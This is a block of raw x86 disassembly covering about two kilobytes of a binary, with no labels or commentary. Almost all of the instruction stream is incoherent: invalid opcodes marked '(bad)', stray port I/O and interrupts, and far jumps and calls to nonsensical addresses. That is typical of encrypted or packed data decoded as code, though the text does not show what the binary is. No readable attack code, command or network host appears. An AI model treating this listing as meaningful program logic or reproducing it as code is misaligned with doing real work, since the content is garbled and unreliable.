  4131dc:	add    ch,0x6b
  4131df:	pop    ecx
  4131e0:	jmp    0x4131b7
  4131e2:	test   eax,0x8ab15890
  4131e7:	mov    eax,0xb277d069
  4131ec:	add    al,0xc8
  4131ee:	mov    al,ds:0xc32e166a
  4131f3:	(bad)  
  4131f4:	cwde   
  4131f5:	mov    esp,0x2cd143d4
  4131fa:	pusha  
  4131fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fc:	cmp    al,dh
  4131fe:	test   eax,0x3d8ee19a
  413203:	pushf  
  413204:	dec    esi
  413205:	retf   
  413206:	in     eax,dx
  413207:	cmp    edi,DWORD PTR [ebp+0x5636af3]
  41320d:	not    esp
  41320f:	xchg   edx,eax
  413210:	and    DWORD PTR [ebx+ecx*2-0x7c4d8f5],edi
  413217:	pop    ebx
  413218:	xchg   esp,eax
  413219:	outs   dx,BYTE PTR ds:[esi]
  41321a:	mov    al,0x6f
  41321c:	btr    edi,ebp
  41321f:	mov    ebp,0xbad63ea7
  413224:	mov    BYTE PTR [ebp+edi*1-0x27eeb7cd],cl
  41322b:	add    al,0x38
  41322d:	cli    
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	adc    dh,0xd3
  413232:	int    0x52
  413234:	imul   eax,DWORD PTR [eax-0x121e8d57],0x62
  41323b:	pop    es
  41323c:	adc    DWORD PTR [ecx+0x76],edx
  41323f:	xor    ebx,DWORD PTR [esi]
  413241:	loop   0x4132a7
  413243:	int    0xce
  413245:	ret    0xd527
  413248:	sub    BYTE PTR [edx],al
  41324a:	push   ebx
  41324b:	(bad)  
  41324d:	pop    edi
  41324e:	cld    
  41324f:	adc    BYTE PTR ds:0x947ed643,dh
  413255:	jns    0x4132d0
  413257:	in     eax,dx
  413258:	clc    
  413259:	popf   
  41325a:	into   
  41325b:	adc    eax,0xf16f7974
  413260:	int3   
  413261:	mov    DWORD PTR [esi-0x376de28d],edx
  413267:	scas   al,BYTE PTR es:[edi]
  413268:	pop    es
  413269:	jp     0x4132aa
  41326b:	addr16 daa 
  41326d:	cmp    eax,0x9b4ae085
  413272:	cdq    
  413273:	shl    BYTE PTR [ecx+0x569acddd],1
  413279:	xchg   ecx,eax
  41327a:	call   0xe54e770
  41327f:	sub    BYTE PTR [esi+0x6f38b8dd],0xc6
  413286:	mov    WORD PTR [edx-0x63],cs
  413289:	adc    DWORD PTR [edx+0x40],ecx
  41328c:	jb     0x4132cd
  41328e:	jmp    DWORD PTR [ebp-0x6d]
  413291:	test   BYTE PTR [edx+0x72],bl
  413294:	inc    esi
  413295:	addr16 dec edi
  413297:	scas   eax,DWORD PTR es:[edi]
  413298:	jns    0x41328c
  41329a:	jp     0x413291
  41329c:	sub    esi,DWORD PTR ds:0x433acb90
  4132a2:	mov    dl,0x1d
  4132a4:	nop
  4132a5:	mov    ebx,0xc4f6ea53
  4132aa:	icebp  
  4132ab:	mov    DWORD PTR ds:0x1d554d07,ebx
  4132b1:	sub    al,0x9e
  4132b3:	in     al,0x4
  4132b5:	push   esp
  4132b6:	ins    DWORD PTR es:[edi],dx
  4132b7:	sbb    BYTE PTR [edx],bl
  4132b9:	in     eax,dx
  4132ba:	inc    ebp
  4132bb:	ds pop edi
  4132bd:	push   ecx
  4132be:	mov    ss:0x2e2f8c76,al
  4132c4:	push   edx
  4132c5:	sub    BYTE PTR ds:0xa1201dec,ah
  4132cb:	add    al,0x91
  4132cd:	ss mov cl,0x1a
  4132d0:	inc    edx
  4132d1:	ret    
  4132d2:	mov    bh,0x7a
  4132d4:	add    eax,0x7c1d22b5
  4132d9:	xlat   BYTE PTR ds:[ebx]
  4132da:	outs   dx,BYTE PTR ds:[esi]
  4132db:	cmp    ebp,ebx
  4132dd:	test   eax,0xd7f81ab
  4132e3:	inc    ax
  4132e5:	sub    BYTE PTR [edx],ch
  4132e7:	push   ebx
  4132e8:	or     ebp,edi
  4132ea:	shr    DWORD PTR [bp+di],cl
  4132ed:	js     0x413314
  4132ef:	or     al,al
  4132f1:	cmp    ebx,DWORD PTR [ebp-0x6dca4615]
  4132f7:	sub    ah,cl
  4132f9:	and    edi,eax
  4132fb:	rcl    BYTE PTR [eax],cl
  4132fd:	xor    DWORD PTR [edx+0xd],ecx
  413300:	mov    ebx,0xa17335a0
  413305:	xor    DWORD PTR [esi-0x28f1db9b],eax
  41330b:	and    al,0xf5
  41330d:	ja     0x4132ab
  41330f:	xor    bh,al
  413311:	cmp    ebp,DWORD PTR [edi+0x608062af]
  413317:	sbb    DWORD PTR [edi+0x46927e68],0x32
  41331e:	jge    0x41330d
  413320:	stos   DWORD PTR es:[edi],eax
  413321:	lock sbb al,0xaa
  413324:	mov    eax,0xf8224448
  413329:	mov    ah,0x8b
  41332b:	mov    cl,0x2e
  41332d:	mov    edi,ss
  41332f:	add    eax,0x43fea51
  413334:	pop    ecx
  413335:	leave  
  413336:	push   edx
  413337:	hlt    
  413338:	sahf   
  413339:	retf   0xfc89
  41333c:	sbb    DWORD PTR [ecx-0x28cf6082],eax
  413342:	adc    ah,BYTE PTR [ebx-0x19c52983]
  413348:	sahf   
  413349:	mov    es,ebp
  41334b:	aaa    
  41334c:	cli    
  41334d:	pop    esp
  41334e:	mov    eax,ds:0xef2cc7c
  413353:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413355:	int    0x80
  413357:	mov    BYTE PTR [ebx+0x72bdeaed],0x6d
  41335e:	xchg   BYTE PTR [esp+eiz*8],bh
  413361:	jb     0x4133e0
  413363:	xor    eax,0xca8b9307
  413368:	stos   DWORD PTR es:[edi],eax
  413369:	xor    al,0x75
  41336b:	mov    DWORD PTR [edi+0x78368ddb],ebp
  413371:	sub    dh,cl
  413373:	jg     0x413313
  413375:	aaa    
  413376:	jle    0x41330f
  413378:	imul   edx,ecx,0x5b4ad3a6
  41337e:	mov    eax,esi
  413380:	retf   
  413381:	xchg   edx,eax
  413382:	or     al,0x32
  413384:	pop    ecx
  413385:	dec    DWORD PTR [ecx]
  413387:	xchg   ebp,eax
  413388:	outs   dx,DWORD PTR ds:[esi]
  413389:	dec    ecx
  41338a:	adc    BYTE PTR [edx-0x75],dl
  41338d:	dec    ebp
  41338e:	in     eax,0x4f
  413390:	xchg   edi,eax
  413391:	mov    ch,0x31
  413393:	pop    ebp
  413394:	stos   DWORD PTR es:[edi],eax
  413395:	or     dl,BYTE PTR [esi+0x27]
  413398:	push   es
  413399:	mov    al,ds:0xb51ae6fb
  41339e:	les    ebx,FWORD PTR [eax-0x19]
  4133a1:	mov    ebp,ss
  4133a3:	xchg   edx,eax
  4133a4:	xchg   edi,eax
  4133a5:	add    eax,0x7c600e54
  4133aa:	ret    
  4133ab:	or     al,0x2b
  4133ad:	jmp    0xb0c13f19
  4133b2:	jle    0x4133c5
  4133b4:	cmp    al,0xd
  4133b6:	scas   al,BYTE PTR es:[edi]
  4133b7:	dec    ebp
  4133b8:	(bad)  
  4133b9:	je     0x4133a5
  4133bb:	push   esp
  4133bc:	cwde   
  4133bd:	or     dh,bh
  4133bf:	addr16 push ss
  4133c1:	ins    BYTE PTR es:[edi],dx
  4133c2:	push   ecx
  4133c3:	inc    eax
  4133c4:	and    BYTE PTR es:[esi],ah
  4133c7:	inc    ecx
  4133c8:	jmp    0xe852b8dc
  4133cd:	pop    eax
  4133ce:	stos   BYTE PTR es:[edi],al
  4133cf:	sbb    DWORD PTR [esi+eiz*2-0x64eaafa0],ebp
  4133d6:	mov    eax,0xcc0e6fec
  4133db:	sbb    ecx,ebp
  4133dd:	push   edx
  4133de:	fstp   st(0)
  4133e0:	dec    eax
  4133e1:	push   eax
  4133e2:	push   ecx
  4133e3:	xor    DWORD PTR ds:0x51d1e951,0x57
  4133ea:	ret    
  4133eb:	dec    esi
  4133ec:	call   0x64eef263
  4133f1:	add    al,0x1a
  4133f3:	and    BYTE PTR [ecx],bh
  4133f5:	jo     0x41341f
  4133f7:	loopne 0x4133a1
  4133f9:	or     al,BYTE PTR [ebx+0x69]
  4133fc:	pop    es
  4133fd:	es jp  0x4133df
  413400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413401:	push   0x6d954962
  413406:	aas    
  413407:	std    
  413408:	push   ebp
  413409:	or     eax,0xd2c0b5aa
  41340e:	xchg   edx,eax
  41340f:	nop
  413410:	and    ebx,DWORD PTR [esi-0x318f6ec4]
  413416:	push   edx
  413417:	xchg   esi,eax
  413418:	inc    esp
  413419:	inc    edx
  41341a:	jmp    FWORD PTR [eax]
  41341c:	mov    bh,0x1c
  41341e:	jb     0x41342b
  413420:	sbb    DWORD PTR [ecx+0x70],edi
  413423:	adc    al,cl
  413425:	(bad)  
  413427:	fisub  DWORD PTR [ecx]
  413429:	lea    esi,ds:0x1aebf463
  41342f:	mov    BYTE PTR [edx+edx*1],bh
  413432:	cmp    al,0xde
  413434:	jecxz  0x413466
  413436:	mov    dl,0xbe
  413438:	pop    edi
  413439:	pop    ss
  41343a:	push   cs
  41343b:	push   cs
  41343c:	stos   DWORD PTR es:[edi],eax
  41343d:	xchg   ebp,eax
  41343e:	push   es
  41343f:	xor    BYTE PTR [ebx],bl
  413441:	jae    0x4133fa
  413443:	ror    DWORD PTR [eax+0x2c],cl
  413446:	jne    0x4133ef
  413448:	dec    ecx
  413449:	xchg   ebp,eax
  41344a:	std    
  41344b:	and    BYTE PTR [eax-0x24],dl
  41344e:	dec    edi
  41344f:	sar    DWORD PTR [ecx+0x3],0xcb
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xe92e150f,al
  413492:	push   0x70706eec
  413497:	mov    ecx,0x4870707e
  41349c:	adc    eax,0xa3b4f7c4
  4134a1:	xchg   ebx,eax
  4134a2:	or     al,BYTE PTR [ebx]
  4134a4:	std    
  4134a5:	hlt    
  4134a6:	ins    BYTE PTR es:[edi],dx
  4134a7:	add    edx,ebp
  4134a9:	fmulp  st(1),st
  4134ab:	jnp    0x4134ae
  4134ad:	xchg   ebp,eax
  4134ae:	xchg   dh,ah
  4134b0:	mov    esp,DWORD PTR [ebx-0x63]
  4134b3:	cli    
  4134b4:	test   BYTE PTR [esi],al
  4134b6:	mov    ds:0xde10050e,al
  4134bb:	or     al,0x30
  4134bd:	cdq    
  4134be:	es bnd jo 0x4134ef
  4134c2:	clc    
  4134c3:	xchg   esp,eax
  4134c4:	mov    cl,0xec
  4134c6:	icebp  
  4134c7:	test   ecx,eax
  4134c9:	mov    ebp,0x79d4b4a
  4134ce:	leave  
  4134cf:	ins    BYTE PTR es:[edi],dx
  4134d0:	loop   0x4134b1
  4134d2:	push   esp
  4134d3:	sub    BYTE PTR [edi-0x16],ah
  4134d6:	inc    DWORD PTR [ebx]
  4134d8:	fimul  WORD PTR [esi-0x2f15004c]
  4134de:	js     0x41349b
  4134e0:	sbb    eax,0x6324db85
  4134e5:	or     eax,0xe5ccebe9
  4134ea:	popa   
  4134eb:	jecxz  0x413566
  4134ed:	mov    ah,0x5d
  4134ef:	pushf  
  4134f0:	mov    al,ds:0xcc9f35c0
  4134f5:	jge    0x4134db
  4134f7:	add    esp,DWORD PTR [eax]
  4134f9:	inc    esi
  4134fa:	mov    eax,ds:0xa86627d6
  4134ff:	push   0x2bf7a349
  413504:	in     al,dx
  413505:	(bad)  
  413506:	rcr    DWORD PTR [esi-0x3b77ecfc],cl
  41350c:	js     0x4134ed
  41350e:	mov    esi,0x92e2d921
  413513:	shr    bl,cl
  413515:	dec    edi
  413516:	jmp    0x413572
  413518:	pop    ebp
  413519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41351a:	call   0xaaff:0x48a22f77
  413521:	les    esp,FWORD PTR [esi-0x7069c9ce]
  413527:	cmc    
  413528:	dec    eax
  413529:	jmp    0xd89b:0x4b861ccf
  413530:	adc    al,0x28
  413532:	int3   
  413533:	and    eax,0x230738cd
  413538:	pop    es
  413539:	pushf  
  41353a:	and    DWORD PTR [esi],esi
  41353c:	pop    esp
  41353d:	js     0x4135b0
  41353f:	pop    ecx
  413540:	or     edx,DWORD PTR [ebp-0x37]
  413543:	dec    edi
  413544:	jbe    0x4135b8
  413546:	repnz sar BYTE PTR [ecx-0x8e84170],0x35
  41354e:	jo     0x413597
  413550:	mov    esi,0x340af7c1
  413555:	inc    ecx
  413557:	sbb    DWORD PTR [ebp+0x2a],0x6f
  41355b:	in     al,0x2e
  41355d:	add    al,0x4f
  41355f:	(bad)  
  413560:	in     al,dx
  413561:	inc    esp
  413562:	xchg   ecx,eax
  413563:	xor    ebx,edx
  413565:	ja     0x41351c
  413567:	adc    esp,DWORD PTR [edi]
  413569:	mov    ch,0xc2
  41356b:	mov    bh,dh
  41356d:	xchg   ebp,eax
  41356e:	cmp    edx,DWORD PTR ds:0x65262dfe
  413574:	sti    
  413575:	xchg   esp,eax
  413576:	push   ebp
  413577:	push   ss
  413578:	jns    0x4135d9
  41357a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41357b:	lock pop edi
  41357e:	mov    ebp,0xa3850fe0
  413583:	(bad)  
  413584:	leave  
  413585:	loopne 0x41355b
  413587:	stos   BYTE PTR es:[edi],al
  413588:	mov    ebx,0x9c02f591
  41358d:	jg     0x413566
  41358f:	call   0x6049c09c
  413594:	hlt    
  413595:	inc    edi
  413596:	mov    dl,0xe7
  413598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41359a:	scas   al,BYTE PTR es:[edi]
  41359b:	outs   dx,DWORD PTR ds:[esi]
  41359c:	addr16 loop 0x4135b1
  41359f:	(bad)  
  4135a0:	pusha  
  4135a1:	sar    edi,1
  4135a3:	shl    BYTE PTR [ebp-0x5522ac7c],0xe8
  4135aa:	into   
  4135ab:	ins    BYTE PTR es:[edi],dx
  4135ac:	adc    dl,BYTE PTR [esi]
  4135ae:	xor    al,0x8
  4135b0:	cmp    al,0xb4
  4135b2:	cld    
  4135b3:	pop    eax
  4135b4:	jo     0x4135a0
  4135b6:	push   ds
  4135b7:	add    DWORD PTR [edi-0x22c6953],esp
  4135bd:	outs   dx,DWORD PTR ds:[esi]
  4135be:	cs cs push esp
  4135c1:	aaa    
  4135c2:	xchg   ebx,eax
  4135c3:	dec    esp
  4135c4:	mov    esp,0x202317e6
  4135c9:	loope  0x4135bb
  4135cb:	repnz push edx
  4135cd:	cmp    edi,DWORD PTR [edi+0x49808e92]
  4135d3:	and    BYTE PTR [ebp-0x169a2ef5],ah
  4135d9:	aad    0x8b
  4135db:	jmp    0x2248a056
  4135e0:	dec    esi
  4135e1:	jg     0x4135a6
  4135e3:	sub    DWORD PTR [edi+0x24f22319],eax
  4135e9:	mov    dh,0xde
  4135eb:	cs (bad) 
  4135ed:	sub    eax,0x12ace442
  4135f2:	or     cl,ah
  4135f4:	test   BYTE PTR [esi-0x46],bl
  4135f7:	mov    BYTE PTR [edx+0x1c7b092b],bl
  4135fd:	jge    0x413645
  4135ff:	mov    ah,0xc3
  413601:	test   DWORD PTR [ebx+0x48],ebx
  413604:	aam    0x45
  413606:	fwait
  413607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413608:	dec    esp
  413609:	adc    cl,cl
  41360b:	xor    eax,0x4b836ff0
  413610:	fist   WORD PTR [eax+0x9]
  413613:	jae    0x41359b
  413615:	push   edx
  413616:	push   es
  413617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413618:	leave  
  413619:	xor    dh,BYTE PTR [ebp+0x2117c573]
  41361f:	xor    al,BYTE PTR [esi+eiz*1+0x6c]
  413623:	and    dl,BYTE PTR [edi+0x5311cb6f]
  413629:	add    al,0xe7
  41362b:	sbb    al,0xa1
  41362d:	pushf  
  41362e:	ret    
  41362f:	out    dx,eax
  413630:	mov    esi,0x169302f3
  413635:	jp     0x41360c
  413637:	jmp    0x5b2c8baa
  41363c:	data16 fnstsw WORD PTR ds:0x2a4c3291
  413643:	leave  
  413644:	popa   
  413645:	imul   edi,DWORD PTR [ebp-0x69d8a57e],0xf4b3244d
  41364f:	mov    ss,WORD PTR [ecx]
  413651:	mov    esp,0xdb420f8c
  413656:	jmp    0x2f83f2c2
  41365b:	sbb    eax,ebp
  41365d:	inc    ebp
  41365e:	push   edx
  41365f:	and    ecx,DWORD PTR ds:[edx]
  413662:	pop    esi
  413663:	xor    DWORD PTR [ecx+0x77],edx
  413666:	rcr    BYTE PTR ds:0x20d8eaed,0x9c
  41366d:	jmp    0x413654
  41366f:	mov    ecx,0xb4ef536
  413674:	fs and eax,ebp
  413677:	push   ecx
  413678:	pop    edi
  413679:	mov    ah,bh
  41367b:	lods   al,BYTE PTR ds:[esi]
  41367c:	ret    0xe581
  41367f:	adc    cl,BYTE PTR [esi-0x17]
  413682:	mov    ch,0xac
  413684:	jmp    0x41365c
  413686:	add    al,0xbf
  413688:	sbb    BYTE PTR [edi+0x1a0c888f],0x26
  41368f:	outs   dx,BYTE PTR ds:[esi]
  413690:	add    DWORD PTR [ebp-0x45eeb65a],esp
  413696:	and    al,0x77
  413698:	dec    edx
  413699:	shr    BYTE PTR [edi-0x19],cl
  41369c:	jne    0x4136ce
  41369e:	mov    bl,0xcc
  4136a0:	add    al,BYTE PTR [eax+ebx*8]
  4136a3:	pop    esp
  4136a4:	daa    
  4136a5:	pop    esi
  4136a6:	call   0xbba:0x9c75f720
  4136ad:	stos   DWORD PTR es:[edi],eax
  4136ae:	cmp    DWORD PTR [ecx+0x41],0xffffffe1
  4136b2:	mov    esp,ebx
  4136b4:	xlat   BYTE PTR ds:[ebx]
  4136b5:	iret   
  4136b6:	add    edx,eax
  4136b8:	jl     0x41371e
  4136ba:	fistp  DWORD PTR ds:0x2991f36e
  4136c0:	sub    eax,DWORD PTR ds:0xb37fcb4e
  4136c6:	ficomp DWORD PTR [edx-0x2fc17e4]
  4136cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136cd:	pop    edi
  4136ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136cf:	jle    0x413700
  4136d1:	cmp    eax,0xfedd1111
  4136d6:	pop    ecx
  4136d7:	push   ds
  4136d8:	stos   DWORD PTR es:[edi],eax
  4136d9:	imul   ecx
  4136db:	loopne 0x41370d
  4136dd:	sbb    al,0xe2
  4136df:	cmp    eax,0x665ddc67
  4136e4:	out    0x5d,eax
  4136e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e7:	data16 jnp 0x4136ea
  4136ea:	jae    0x41374c
  4136ec:	test   BYTE PTR [edi-0x18e623e8],dl
  4136f2:	fist   WORD PTR [eax+0x25d59025]
  4136f8:	jmp    0x28b725a7
  4136fd:	xchg   edx,eax
  4136fe:	jae    0x4136b8
  413700:	fdivr  DWORD PTR [edx+ebx*2+0x51]
  413704:	sbb    esi,DWORD PTR [edi+0x4fe0e0b8]
  41370a:	xchg   esp,eax
  41370b:	inc    ebp
  41370c:	sti    
  41370d:	lahf   
  41370e:	ja     0x413786
  413710:	pop    edi
  413712:	dec    esp
  413713:	cmp    DWORD PTR [edi-0x3f],0x24
  413717:	sbb    al,0xaa
  413719:	mov    ds:0x403439ba,eax
  41371e:	ss addr16 push ds
  413721:	inc    ebx
  413722:	aam    0xc8
  413724:	dec    ebx
  413725:	test   eax,0xb814e782
  41372a:	push   0x3ed2d22e
  41372f:	ja     0x413765
  413731:	rcl    DWORD PTR [esi+0x1],1
  413734:	sbb    cl,al
  413736:	or     DWORD PTR [edx+0x29360056],ebp
  41373c:	sub    al,BYTE PTR [edx+0x33765051]
  413742:	(bad)  
  413743:	jl     0x413731
  413745:	shl    DWORD PTR [eax],cl
  413747:	imul   edx,esp,0x66
  41374a:	in     al,0xce
  41374c:	call   0x2c85b67b
  413751:	outs   dx,BYTE PTR ds:[esi]
  413752:	rol    BYTE PTR [eax+0x36],cl
  413755:	mov    ah,0xc2
  413757:	in     al,0xad
  413759:	(bad)  
  41375a:	fisttp DWORD PTR [ebx-0x48]
  41375d:	test   esi,eax
  41375f:	inc    ecx
  413760:	(bad)  
  413761:	dec    esi
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	lock pop ebx
  413780:	xor    ah,BYTE PTR [esi+0x70706b35]
  413786:	mov    ecx,0xb670707e
  41378b:	sbb    DWORD PTR [ebx+0x66d88f49],edi
  413791:	dec    ebp
  413792:	or     eax,0xb0549807
  413797:	adc    DWORD PTR cs:[edi],esp
  41379a:	mov    ?,WORD PTR [ebx]
  41379c:	test   eax,0xe4e28e6
  4137a1:	loopne 0x413783
  4137a3:	aaa    
  4137a4:	inc    ecx
  4137a5:	add    eax,0x809cd71a
  4137aa:	xchg   ebx,eax
  4137ab:	xor    bl,BYTE PTR [edx+0x26]
  4137ae:	mov    ch,0x30
  4137b0:	fsub   QWORD PTR [ebx+eax*1+0x4fb4b1ba]
  4137b7:	ins    DWORD PTR es:[edi],dx
  4137b8:	sub    ebx,DWORD PTR [edx+0x20]
  4137bb:	stos   BYTE PTR es:[edi],al
  4137bc:	repz mov bl,0xc7
  4137bf:	cmp    al,0x66
  4137c1:	ins    BYTE PTR es:[edi],dx
  4137c2:	and    al,dl
  4137c4:	(bad)  
  4137c5:	mov    bl,0x87
  4137c7:	pop    ecx
  4137c8:	pop    ebp
  4137c9:	sbb    BYTE PTR [esi],bh
  4137cb:	and    eax,0x282c36ba
  4137d0:	call   0xdd51:0xe4e5017
  4137d7:	push   esi
  4137d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d9:	orps   xmm3,xmm7
  4137dc:	(bad)  
  4137dd:	cmp    eax,0xb0291934
  4137e2:	adc    ebp,DWORD PTR [ebp+edx*8-0x4b]
  4137e6:	iret   
  4137e7:	jg     0x4137c4
  4137e9:	add    bl,BYTE PTR [ebx+0x2a895fca]
  4137ef:	aaa    
  4137f0:	xor    bl,BYTE PTR [edi-0x66fc087c]
  4137f6:	lea    edx,[ebx]
  4137f8:	xchg   BYTE PTR [esi-0x6ff70999],ch
  4137fe:	fwait
  4137ff:	xlat   BYTE PTR ds:[ebx]
  413800:	sub    DWORD PTR [edx+0x2a],ecx
  413803:	scas   eax,DWORD PTR es:[edi]
  413804:	fwait
  413805:	push   ebp
  413806:	xchg   ebx,eax
  413807:	jmp    0xdad2:0xa96e1e7
  41380e:	adc    eax,0x903ecbc1
  413813:	jnp    0x41379d
  413815:	pop    eax
  413816:	mov    bh,0x7a
  413818:	xchg   ecx,eax
  413819:	test   al,0x82
  41381b:	js     0x41389b
  41381d:	mov    dl,0xed
  41381f:	hlt    
  413820:	push   ecx
  413821:	test   al,0x1f
  413823:	push   ebx
  413824:	test   eax,0xdd6a5f66
  413829:	xor    BYTE PTR [edx+0x7dd01345],dl
  41382f:	pushf  
  413830:	loope  0x4137fd
  413832:	xor    eax,0x1505e4a6
  413837:	mov    ebx,fs
  413839:	retf   
  41383a:	adc    BYTE PTR [ebx+0x5d],bh
  41383d:	sahf   
  41383e:	leave  
  41383f:	cmp    eax,0x4d9272b4
  413844:	bound  edx,QWORD PTR [bx-0x2a6a]
  413849:	out    0xc5,al
  41384b:	sbb    eax,0x244bc2b9
  413850:	(bad)  [edi]
  413852:	rol    ebp,0x12
  413855:	push   ebp
  413856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413857:	add    al,0x47
  413859:	retf   0x6b14
  41385c:	sbb    BYTE PTR [esi+0x4ed95ab],0xa4
  413863:	mov    esp,0x6b258794
  413868:	ret    0xb19c
  41386b:	div    edx
  41386d:	mov    edi,0x63e60991
  413872:	push   esp
  413873:	(bad)
  413877:	jo     0x4138c3
  413879:	adc    edi,DWORD PTR [eax+0x11020c04]
  41387f:	fcomip st,st(1)
  413881:	xchg   esp,eax
  413882:	jne    0x4138f5
  413884:	cmp    BYTE PTR [edx],0x73
  413887:	push   es
  413888:	test   BYTE PTR [ecx],0xc3
  41388b:	scas   eax,DWORD PTR es:[edi]
  41388c:	cdq    
  41388d:	jno    0x41383f
  41388f:	jmp    0x4138e8
  413891:	adc    al,0xdf
  413893:	fwait
  413894:	adc    al,0x54
  413896:	push   0x4b2aa612
  41389b:	ja     0x41390c
  41389d:	fild   QWORD PTR [ebp+0x58]
  4138a0:	jbe    0x41385d
  4138a2:	pop    ebx
  4138a3:	jo     0x413854
  4138a5:	or     al,0x3
  4138a7:	data16 adc dh,BYTE PTR [ebx]
  4138aa:	inc    ebp
  4138ab:	repnz fadd DWORD PTR [ebp+0x562fbbc9]
  4138b2:	ins    DWORD PTR es:[edi],dx
  4138b3:	hlt    
  4138b4:	sbb    eax,0x23d5e649
  4138b9:	pop    ss
  4138ba:	pop    ebp
  4138bb:	mov    esi,0x97543846
  4138c0:	ret    
  4138c1:	mov    al,BYTE PTR [edx+0x1329b104]
  4138c7:	not    BYTE PTR [ebx+0x30]
  4138ca:	jg     0x41385a
  4138cc:	sub    al,0xe8
  4138ce:	mov    ds:0x24a08de3,al
  4138d3:	push   eax
  4138d4:	push   ebx
  4138d5:	sbb    al,0x7f
  4138d7:	out    dx,ax
  4138d9:	push   ds
  4138da:	aad    0x35
  4138dc:	sbb    DWORD PTR [eax+0x56b46611],edi
  4138e2:	xor    ebx,0xffffffe9
  4138e5:	push   ds
  4138e6:	adc    DWORD PTR [ebx],eax
  4138e8:	push   esi
  4138e9:	hlt    
  4138ea:	push   ecx
  4138eb:	xchg   esp,eax
  4138ec:	pop    ebx
  4138ed:	push   ss
  4138ee:	dec    ecx
  4138ef:	sar    BYTE PTR [ecx-0x5ced23b4],1
  4138f5:	sbb    eax,0xfba995c3
  4138fa:	outs   dx,BYTE PTR ds:[esi]
  4138fb:	pop    ds
  4138fc:	repnz (bad) 
  4138fe:	ja     0x413900
  413900:	xor    BYTE PTR [ebx-0x13d6e59c],cl
  413906:	push   edx
  413907:	lods   al,BYTE PTR ds:[esi]
  413908:	jp     0x4138cd
  41390a:	hlt    
  41390b:	lfs    esp,FWORD PTR [ecx-0x64c20659]
  413912:	jbe    0x4138d1
  413914:	and    BYTE PTR [ecx],0xc0
  413917:	jnp    0x4138c5
  413919:	in     al,0xfc
  41391b:	mov    ch,0x1f
  41391d:	lods   al,BYTE PTR ds:[esi]
  41391e:	mov    ah,0xf5
  413920:	out    dx,eax
  413921:	std    
  413922:	aad    0x17
  413924:	and    BYTE PTR [esi-0x24],ah
  413927:	loop   0x41397c
  413929:	dec    esp
  41392a:	js     0x413938
  41392c:	in     eax,0xe7
  41392e:	scas   eax,DWORD PTR es:[edi]
  41392f:	es and al,0xc8
  413932:	sub    BYTE PTR [edx-0x52af1a0],al
  413938:	stos   DWORD PTR es:[edi],eax
  413939:	and    edi,DWORD PTR [edx+0x3b3b6bf5]
  41393f:	(bad)  
  413940:	xchg   cl,ah
  413942:	mov    DWORD PTR ds:0x70cf3078,esi
  413948:	push   ds
  413949:	sub    eax,DWORD PTR [edx+edx*4-0x78]
  41394d:	and    al,BYTE PTR [edx-0x5335c31]
  413953:	mov    dl,0x84
  413955:	call   0x7034:0x49be8e31
  41395c:	mov    dl,0x9f
  41395e:	or     DWORD PTR [edi+0x4c],eax
  413961:	dec    edx
  413962:	or     BYTE PTR [esi],dh
  413964:	scas   al,BYTE PTR es:[di]
  413966:	jb     0x4139da
  413968:	xchg   ebx,eax
  413969:	jne    0x41397f
  41396b:	jecxz  0x4139e8
  41396d:	mov    dh,0x34
  41396f:	scas   al,BYTE PTR es:[edi]
  413970:	mov    WORD PTR [ebx-0x13],?
  413973:	repnz pop ebp
  413975:	imul   ecx
  413977:	(bad)  
  413978:	out    dx,eax
  413979:	pop    ecx
  41397a:	(bad)  
  41397b:	out    dx,eax
  41397c:	mov    eax,0x3c4a4fd1
  413981:	call   0x2b76:0x54ab3f7a
  413988:	cmp    esp,edi
  41398a:	pop    ebx
  41398b:	mov    cl,0x43
  41398d:	cmp    esp,eax
  41398f:	pop    es
  413990:	lea    edi,[edx-0x2c824d80]
  413996:	jne    0x41398f
  413998:	mov    ecx,0x80600828
  41399d:	lahf   
  41399e:	mov    edx,0xd64fd699
  4139a3:	enter  0x2a71,0x48
  4139a7:	mov    dh,0x8d
  4139a9:	lods   eax,DWORD PTR ds:[esi]
  4139aa:	mul    edi
  4139ac:	cmp    BYTE PTR [eax],0xac
  4139af:	fst    QWORD PTR [edx]
  4139b1:	aaa    
  4139b2:	xor    eax,0x1e3a057c
  4139b7:	daa    
  4139b8:	dec    esi
  4139b9:	sub    dh,BYTE PTR [esi+0x2ce7411b]
  4139bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139c0:	loop   0x413988
  4139c2:	adc    al,0xd2
  4139c4:	aam    0x92
  4139c6:	or     eax,0x3a234ad
  4139cb:	or     al,0x8d
  4139cd:	mov    edx,0xf328cd91
  4139d2:	mov    esi,0x52783587
  4139d7:	test   DWORD PTR [esi-0x5d],edx
  4139da:	shr    BYTE PTR [esi],1
